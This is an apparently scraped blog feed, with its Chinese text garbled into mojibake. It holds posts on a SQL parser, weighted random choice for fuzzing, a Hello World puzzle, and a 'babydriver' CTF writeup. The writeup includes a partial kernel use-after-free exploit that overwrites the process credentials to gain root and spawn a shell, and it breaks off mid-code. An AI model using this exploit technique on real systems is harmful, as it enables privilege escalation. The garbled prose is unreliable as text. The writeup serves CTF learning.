<h4 id="0x04-sqlåˆ†æ"><a href="#0x04-sqlåˆ†æ" class="headerlink" title="0x04: sqlåˆ†æ"></a>0x04: sqlåˆ†æ</h4><p>ä¹¦ä¸­ç¬¬å››ç« æ˜¯ä¸€ä¸ªsqlçš„åˆ†æå™¨ï¼Œå«è¯æ³•åˆ†æã€è¯­æ³•åˆ†æï¼Œä»£ç é‡è¿˜å¥½ä¸ç®—ç‰¹åˆ«å¤§ã€‚</p>
<p>ç›®å½•ç»“æ„:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ tree .</span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ Makefile</span><br><span class="line">â”œâ”€â”€ glrmysql.l  <span class="comment">#mysqlå­é›†è¯æ³•åˆ†æå™¨</span></span><br><span class="line">â”œâ”€â”€ glrmysql.y  <span class="comment">#mysqlå­é›†è¯­æ³•åˆ†æå™¨</span></span><br><span class="line">â”œâ”€â”€ lpmysql.l</span><br><span class="line">â”œâ”€â”€ lpmysql.y</span><br><span class="line">â”œâ”€â”€ pmysql.l</span><br><span class="line">â””â”€â”€ pmysql.y</span><br></pre></td></tr></table></figure></p>
<p><code>*.l</code>æ˜¯è¯æ³•åˆ†æéƒ¨åˆ†ï¼Œ<code>*.y</code>æ˜¯è¯­æ³•åˆ†æéƒ¨åˆ†ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸‰ä»½ä»£ç ï¼Œ<code>glrxxxxx</code>æ˜¯ç¬¬å››ç« çš„ä»£ç ï¼Œ<code>lpmxxxx</code>æ˜¯ç¬¬å…«ç« çš„ä»£ç ï¼Œ<code>pmysqlxx</code>æ˜¯ç¬¬ä¹ç« çš„ä»£ç ï¼Œè¿™é‡Œåªçœ‹ç¬¬å››ç« çš„ä»£ç ï¼Œè¿™ä¸ªä¾‹å­æ¯”è¾ƒç®€å•ï¼Œç®€åŒ–äº†å¾ˆå¤šä¸œè¥¿ã€‚</p>
<h4 id="0x05-å¼•ç”¨"><a href="#0x05-å¼•ç”¨" class="headerlink" title="0x05: å¼•ç”¨"></a>0x05: å¼•ç”¨</h4><p><a href="https://www.zhihu.com/question/20750344" target="_blank" rel="noopener">åœ¨ç¼–ç¨‹æ¦‚å¿µä¸­ï¼Œè¡¨è¾¾å¼å’Œè¯­å¥åˆ†åˆ«æ˜¯ä»€ä¹ˆæ¦‚å¿µï¼Ÿ</a><br><a href="https://zh.wikipedia.org/wiki/%E5%B7%A6%E9%81%9E%E6%AD%B8" target="_blank" rel="noopener">å·¦é€’å½’</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-èµ·å› &quot;&gt;&lt;a href=&quot;#0x00-èµ·å› &quot; class=&quot;headerlink&quot; title=&quot;0x00: èµ·å› &quot;&gt;&lt;/a&gt;0x00: èµ·å› &lt;/h4&gt;&lt;p&gt;å·¥ä½œä¸Šçš„ä¸€äº›åŸå› éœ€è¦å­¦ä¹ ä¸€ä¸‹ã€‚åšä¸ªè®°å½•ç£ä¿ƒè‡ªå·±è¯»ä¹¦å­¦ä¹ ï¼Œå¥½å¥½å­¦ä¹ ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="Study" scheme="http://o0xmuhe.me/tags/Study/"/>
    
  </entry>
  
  <entry>
    <title>PythonæŒ‡å®šæ¦‚ç‡è·å–éšæœºå…ƒç´ </title>
    <link href="http://o0xmuhe.me/2017/12/30/Python%E6%8C%87%E5%AE%9A%E6%A6%82%E7%8E%87%E8%8E%B7%E5%8F%96%E9%9A%8F%E6%9C%BA%E5%85%83%E7%B4%A0/"/>
    <id>http://o0xmuhe.me/2017/12/30/PythonæŒ‡å®šæ¦‚ç‡è·å–éšæœºå…ƒç´ /</id>
    <published>2017-12-30T09:17:01.000Z</published>
    <updated>2017-12-30T09:27:56.053Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>æœ€è¿‘å†™fuzzeré‡åˆ°äº†è¿™æ ·çš„ä¸€ä¸ªéœ€æ±‚ï¼Œç”Ÿæˆæ ·æœ¬çš„æ—¶å€™ï¼Œæœ‰äº›å…ƒç´ éœ€è¦å°½å¯èƒ½çš„å¤šå‡ºç°ï¼Œè€Œæœ‰äº›éœ€è¦å°‘ä¸€ç‚¹ï¼Œè¿™å°±æ¶‰åŠåˆ°æ¦‚ç‡çš„é—®é¢˜äº†ã€‚ç„¶è€Œç›´æ¥ä½¿ç”¨randomæ˜¯ä¸è¡Œçš„ï¼Œæš´åŠ›çš„åœ¨lib_listä¸Šåšæ–‡ç« ä¹Ÿä¸è¡Œï¼Œåè€Œæ•ˆç‡æ›´ä½ã€‚çœ‹åˆ°äº†python cookbookçš„ä¸¤ä¸ªä¾‹å­ã€‚</p>
<a id="more"></a>
<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01:"></a>0x01:</h4><h5 id="ç¬¬ä¸€ç§ï¼Œç»™å®šæ¦‚ç‡"><a href="#ç¬¬ä¸€ç§ï¼Œç»™å®šæ¦‚ç‡" class="headerlink" title="ç¬¬ä¸€ç§ï¼Œç»™å®šæ¦‚ç‡"></a>ç¬¬ä¸€ç§ï¼Œç»™å®šæ¦‚ç‡</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_pick</span><span class="params">(some_list,probabilities)</span>:</span></span><br><span class="line">    x = random.uniform(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    cumulative_probability=<span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> item,item_probability <span class="keyword">in</span> zip(some_list,probabilities):</span><br><span class="line">        cumulative_probability+=item_probability</span><br><span class="line">        <span class="keyword">if</span> x &lt; cumulative_probability:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>
<p>ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯å‚æ•°åˆ—è¡¨ï¼Œç¬¬äºŒä¸ªæ˜¯æ¦‚ç‡çš„åˆ—è¡¨ï¼Œæ¦‚ç‡åˆ—è¡¨é‡Œå…ƒç´ ç›¸åŠ å’Œå¿…é¡»ç­‰äº1<br>æ¯”å¦‚è¿™ä¹ˆè°ƒç”¨ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">random_pick([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">0.1</span>,<span class="number">0.2</span>,<span class="number">0.3</span>,<span class="number">0.4</span>])</span><br></pre></td></tr></table></figure></p>
<p>å†™ä»£ç å¤§æ¦‚æµ‹äº†ä¸‹ï¼Œåœ¨å¤§é‡(&gt;10w)çš„æµ‹è¯•ä¸‹ï¼Œæ¯”è¾ƒç¨³å®šï¼ŒæŒ‰ç…§æŒ‡å®šæ¦‚ç‡äº§ç”Ÿå…ƒç´ ï¼Œæ¯”å¦‚xç­‰äº0.1å°±è¿”å›1ã€‚<br>ä½†æ˜¯ä¸å¤ªé€‚åˆè¾ƒå¤šå‚æ•°çš„æƒ…å†µï¼Œéœ€è¦ä¸€ä¸ªä¸€ä¸ªæŒ‡å®šæ¦‚ç‡å•¥çš„ï¼Œè¿˜è¦è®¡ç®—å¥½æ¦‚ç‡å’Œä¸º1â€¦è›‹ç–¼ã€‚</p>
<h5 id="ç¬¬äºŒç§ï¼Œç»™æƒé‡"><a href="#ç¬¬äºŒç§ï¼Œç»™æƒé‡" class="headerlink" title="ç¬¬äºŒç§ï¼Œç»™æƒé‡"></a>ç¬¬äºŒç§ï¼Œç»™æƒé‡</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_picks</span><span class="params">(sequence,relative_odds)</span>:</span></span><br><span class="line">ã€€ã€€table=[z <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(sequence,relative_odds) <span class="keyword">for</span> z <span class="keyword">in</span> [x]*y]</span><br><span class="line">ã€€ã€€<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">ã€€ã€€ã€€ã€€<span class="keyword">yield</span> random.choice(table)</span><br><span class="line"></span><br><span class="line">x=random_picks(<span class="string">'ciao'</span>,[<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>])</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(itertools.islice(x,<span class="number">8</span>))</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒç§æ ¹æ®æƒé‡æ¥è¿”å›ï¼Œåªè¦æ±‚æƒé‡æ˜¯éè´Ÿæ•´æ•°ï¼Œæ¯”è¾ƒå®¹æ˜“ä½¿ç”¨ï¼Œè™½ç„¶è¿˜æ˜¯è¦ä¸€ä¸ªä¸€ä¸ªç»™æƒé‡ï¼Œä½†æ˜¯æ€»æ¯”è¿˜è¦å»è®¡ç®—ä¸ªæ¦‚ç‡å’Œï¼Œå¥½å¾ˆå¤šã€‚</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00:&quot;&gt;&lt;/a&gt;0x00:&lt;/h4&gt;&lt;p&gt;æœ€è¿‘å†™fuzzeré‡åˆ°äº†è¿™æ ·çš„ä¸€ä¸ªéœ€æ±‚ï¼Œç”Ÿæˆæ ·æœ¬çš„æ—¶å€™ï¼Œæœ‰äº›å…ƒç´ éœ€è¦å°½å¯èƒ½çš„å¤šå‡ºç°ï¼Œè€Œæœ‰äº›éœ€è¦å°‘ä¸€ç‚¹ï¼Œè¿™å°±æ¶‰åŠåˆ°æ¦‚ç‡çš„é—®é¢˜äº†ã€‚ç„¶è€Œç›´æ¥ä½¿ç”¨randomæ˜¯ä¸è¡Œçš„ï¼Œæš´åŠ›çš„åœ¨lib_listä¸Šåšæ–‡ç« ä¹Ÿä¸è¡Œï¼Œåè€Œæ•ˆç‡æ›´ä½ã€‚çœ‹åˆ°äº†python cookbookçš„ä¸¤ä¸ªä¾‹å­ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://o0xmuhe.me/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Hello Worldå‡çº§ç‰ˆ</title>
    <link href="http://o0xmuhe.me/2017/10/01/Hello-World%E5%8D%87%E7%BA%A7%E7%89%88/"/>
    <id>http://o0xmuhe.me/2017/10/01/Hello-Worldå‡çº§ç‰ˆ/</id>
    <published>2017-10-01T10:02:25.000Z</published>
    <updated>2017-10-01T10:30:46.310Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>å¶ç„¶åœ¨çŸ¥ä¹ä¸Šçœ‹åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œç‰¹æ®Šçš„æ–¹å¼è¾“å‡ºhello worldï¼Œåæ¥çŸ¥é“è¿™æ˜¯cnssçš„æ‹›æ–°é¢˜ç›®ï¼Œæ„Ÿè§‰è¿˜æŒºæœ‰æ„æ€çš„ï¼Œåšäº†ä¸‹è®°å½•ä¸‹æ¥ã€‚</p>
<a id="more"></a>
<p>é¢˜ç›®è¦æ±‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.ä¸ç”¨ â€œ â€  è¾“å‡ºHello World</span><br><span class="line">2.ä¸ç”¨ ;  è¾“å‡ºHello World</span><br><span class="line">3.ä¸ç”¨#  è¾“å‡ºHello World</span><br><span class="line">4.ä¸ç”¨æ‹¬å·è¾“å‡ºHello World (åŒ…æ‹¬å„ç§æ‹¬å·()ï¼Œ&lt;&gt;ï¼Œï½›ï½ï¼Œï¼»ï¼½éƒ½ä¸èƒ½ç”¨ )</span><br></pre></td></tr></table></figure>
<h4 id="0x01-level-1"><a href="#0x01-level-1" class="headerlink" title="0x01: level 1"></a>0x01: level 1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ cat test.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">72</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">101</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">108</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">108</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">111</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">119</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">111</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">114</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">108</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:10:11]</span></span><br><span class="line">$ ./<span class="built_in">test</span></span><br><span class="line">Hello world</span><br></pre></td></tr></table></figure>
<h4 id="0x02-level-2"><a href="#0x02-level-2" class="headerlink" title="0x02: level 2"></a>0x02: level 2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ cat test.c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">72</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">101</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">32</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">119</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">114</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">100</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">10</span>)) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:15:10]</span></span><br><span class="line">$ clang test.c -o <span class="built_in">test</span></span><br><span class="line">test.c:3:8: warning: implicit declaration of <span class="keyword">function</span> <span class="string">'putchar'</span> is invalid <span class="keyword">in</span> C99</span><br><span class="line">      [-Wimplicit-function-declaration]</span><br><span class="line">    <span class="keyword">if</span>(putchar(72)) &#123;&#125;</span><br><span class="line">       ^</span><br><span class="line">1 warning generated.</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:15:15]</span></span><br><span class="line">$ ./<span class="built_in">test</span></span><br><span class="line">Hello wrld</span><br></pre></td></tr></table></figure>
<h4 id="0x03-level-3"><a href="#0x03-level-3" class="headerlink" title="0x03: level 3"></a>0x03: level 3</h4><p>ä¸»è¦æ˜¯#ç¬¦å·çš„æ›¿ä»£ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ cat test.c</span><br><span class="line">%:include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    if(putchar(72)) &#123;&#125;</span><br><span class="line">    if(putchar(101)) &#123;&#125;</span><br><span class="line">    if(putchar(108)) &#123;&#125;</span><br><span class="line">    if(putchar(108)) &#123;&#125;</span><br><span class="line">    if(putchar(111)) &#123;&#125;</span><br><span class="line">    if(putchar(32)) &#123;&#125;</span><br><span class="line">    if(putchar(119)) &#123;&#125;</span><br><span class="line">    if(putchar(114)) &#123;&#125;</span><br><span class="line">    if(putchar(108)) &#123;&#125;</span><br><span class="line">    if(putchar(100)) &#123;&#125;</span><br><span class="line">    if(putchar(10)) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:18:03]</span></span><br><span class="line">$ clang test.c -o <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:18:05]</span></span><br><span class="line">$ ./<span class="built_in">test</span></span><br><span class="line">Hello wrld</span><br></pre></td></tr></table></figure>
<h4 id="0x04-level-4"><a href="#0x04-level-4" class="headerlink" title="0x04: level 4"></a>0x04: level 4</h4><p>è¿™ä¸ªå¥½éš¾æƒ³â€¦shellcodeè¡Œä¹ˆæˆ‘æƒ³è¯´â€¦<br>msfvenomç›´æ¥ç”Ÿæˆä¸€ä¸ªâ€¦<br>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œscä¹Ÿè¦æ‰§è¡Œå•Šï¼Œå’‹è§„é¿æ‹¬å·ï¼Œéš¾é“è¦æ‰‹å†™ä¸€ä¸ªPE/ELFæ–‡ä»¶ä¹ˆã€‚</p>
<h4 id="0x05-ç»“è¯­"><a href="#0x05-ç»“è¯­" class="headerlink" title="0x05: ç»“è¯­"></a>0x05: ç»“è¯­</h4><p>æŒºæœ‰æ„æ€çš„é—®é¢˜ï¼Œè¿™ä¸ªä¸œè¥¿ä»è€…è§ä»ï¼Œæ™ºè€…è§æ™ºï¼ŒçŸ¥ä¹ä¸Šè§åˆ°å¤ªå¤šæ–¹å¼äº†ï¼Œæ¯•ç«Ÿputcharå¾ˆä¸‘é™‹ï¼Œè½®å­å“¥é‚£ä¸ªä»£ç è¿˜æ˜¯æŒºå¥½çœ‹çš„ã€‚è‡³äºlevel 4ï¼Œæœ‰äººæåˆ°äº†hack cï¼Œå¾ˆå¯æƒœUBâ€¦</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00:&quot;&gt;&lt;/a&gt;0x00:&lt;/h4&gt;&lt;p&gt;å¶ç„¶åœ¨çŸ¥ä¹ä¸Šçœ‹åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œç‰¹æ®Šçš„æ–¹å¼è¾“å‡ºhello worldï¼Œåæ¥çŸ¥é“è¿™æ˜¯cnssçš„æ‹›æ–°é¢˜ç›®ï¼Œæ„Ÿè§‰è¿˜æŒºæœ‰æ„æ€çš„ï¼Œåšäº†ä¸‹è®°å½•ä¸‹æ¥ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="C" scheme="http://o0xmuhe.me/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>babydriver writeup</title>
    <link href="http://o0xmuhe.me/2017/07/13/babydriver-writeup/"/>
    <id>http://o0xmuhe.me/2017/07/13/babydriver-writeup/</id>
    <published>2017-07-13T08:23:34.000Z</published>
    <updated>2017-08-20T08:55:12.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>ä¹‹å‰å›½èµ›çš„ä¸€ä¸ªLinux kernel pwnï¼ŒAtumå¤§ä½¬çš„é¢˜ç›®ã€‚</p>
<a id="more"></a>
<p>ç®€å•çš„æ¥è¯´å°±æ˜¯kernelçš„UAFï¼Œæ€ä¹ˆåˆ©ç”¨å°±ä»è€…è§ä»ï¼Œæ™ºè€…è§æ™ºäº†ã€‚</p>
<ol>
<li><p>å¤æ‚ä¸€ç‚¹ï¼Œ0ctf knoteçš„æ€è·¯ï¼Œå–·å°„tty_structå†…æ ¸å¯¹è±¡ï¼Œç„¶ååˆ©ç”¨writeæ–¹æ³•ä¿®æ”¹è¿™ä¸ªå†…æ ¸å¯¹è±¡ï¼Œå®Œæˆææƒï¼Œä½†æ˜¯è¦bypass smtpä¿æŠ¤ï¼Œè¿™ä¸ªéœ€è¦ROPã€‚</p>
</li>
<li><p>èµ›åé—®äº†å‡ºé¢˜äººï¼Œæœ€ç®€å•çš„æ–¹æ³•ï¼Œç›´æ¥forkï¼Œåˆ©ç”¨writeæ–¹æ³•æ”¹uidå»æ‹¿rootï¼Œä»£ç ä¹Ÿå¾ˆçŸ­ï¼Œä¸éœ€è¦bypass é‚£äº›ä¿æŠ¤ã€‚</p>
</li>
</ol>
<p>æ–¹æ³•1çš„è¯fpçš„wpå†™çš„å¾ˆæ¸…æ¥š(è†œçŸ³æ€»+æ—åšå£«),æ–¹æ³•2çš„è¯æ–‡ç« åé¢ä¼šæ”¾å‡ºå‡ºé¢˜äººçš„expã€‚</p>
<h4 id="0x01-å‡ºé¢˜äººçš„exp"><a href="#0x01-å‡ºé¢˜äººçš„exp" class="headerlink" title="0x01: å‡ºé¢˜äººçš„exp"></a>0x01: å‡ºé¢˜äººçš„exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">long</span> <span class="keyword">long</span> credsize=<span class="number">168</span>;</span><br><span class="line"><span class="keyword">char</span> *dev=<span class="string">"/dev/babydev"</span>;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> racestop=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> releasedone=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1,fd2,ret;</span><br><span class="line">    <span class="keyword">char</span> zero[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fd1=open(dev,O_RDWR);</span><br><span class="line">    fd2=open(dev,O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fd1=%d\n fd2=%d\n"</span>,fd1,fd2);</span><br><span class="line">    ret=ioctl(fd1,<span class="number">0x10001</span>,credsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ioctl in main =%d\n"</span>,ret);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">int</span> pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error,pid&lt;0"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        ret=write(fd2,zero,<span class="number">28</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"write in writebuf=%d\n"</span>,ret);</span><br><span class="line"></span><br><span class="line">        t=getuid();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"uid=%d\n"</span>,t);</span><br><span class="line">        <span class="keyword">if</span>(t==<span class="number">0</span>)&#123;</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span 